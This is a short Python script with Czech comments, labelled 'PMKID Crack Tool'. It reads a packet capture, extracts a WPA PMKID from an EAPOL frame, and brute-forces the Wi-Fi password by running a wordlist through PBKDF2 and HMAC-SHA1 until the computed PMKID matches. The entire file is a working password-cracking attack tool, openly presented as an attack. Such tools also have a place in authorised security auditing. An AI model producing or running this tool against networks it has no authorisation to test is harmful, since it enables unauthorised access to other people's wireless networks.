import argparse
import hashlib
import binascii
from scapy.all import rdpcap
import hmac  # Přidat na začátek kódu

# Konstanta pro výpočet PMKID
PMKID_NAME = b"PMK Name"

def extract_pmkid(pcap_file):
    """ Extrahuje PMKID ze souboru .cap nebo .pcap """
    packets = rdpcap(pcap_file)
    
    for packet in packets:
        if packet.haslayer("EAPOL"):
            raw_bytes = bytes(packet)
            if len(raw_bytes) >= 86:
                ap_mac = packet.addr2.replace(":", "").lower()
                client_mac = packet.addr1.replace(":", "").lower()
                pmkid = binascii.hexlify(raw_bytes[-16:]).decode()
                return ap_mac, client_mac, pmkid
    
    return None, None, None

def derive_pmk(psk, ssid):
    """ Vypočítá PMK z PSK a SSID pomocí PBKDF2-HMAC-SHA1 """
    return hashlib.pbkdf2_hmac("sha1", psk.encode(), ssid.encode(), 4096, 32)

def verify_pmkid(pmk, ap_mac, client_mac):
    """ Vypočítá PMKID a porovná s extrahovaným PMKID """
    data = PMKID_NAME + binascii.unhexlify(ap_mac) + binascii.unhexlify(client_mac)
    return binascii.hexlify(hmac.new(pmk, data, hashlib.sha1).digest()[:16]).decode()

def crack_pmkid(wordlist, ssid, ap_mac, client_mac, target_pmkid):
    """ Prochází slovník a hledá odpovídající heslo """
    with open(wordlist, "r", encoding="utf-8") as f:
        for password in f:
            password = password.strip()
            pmk = derive_pmk(password, ssid)
            computed_pmkid = verify_pmkid(pmk, ap_mac, client_mac)

            if computed_pmkid == target_pmkid:
                print(f"[✔] Heslo nalezeno: {password}")
                return password
    print("[✖] Heslo nenalezeno.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PMKID Crack Tool")
    parser.add_argument("-P", "--password-list", required=True, help="Cesta ke slovníku")
    parser.add_argument("capture", help="PCAP soubor obsahující PMKID")
    args = parser.parse_args()

    ap_mac, client_mac, target_pmkid = extract_pmkid(args.capture)

    if not target_pmkid:
        print("[✖] PMKID nebyl nalezen v souboru.")
        exit(1)

    ssid = input("Zadejte SSID (název Wi-Fi sítě): ").strip()

    print("[🔎] Zahajuji útok...")
    crack_pmkid(args.password_list, ssid, ap_mac, client_mac, target_pmkid)
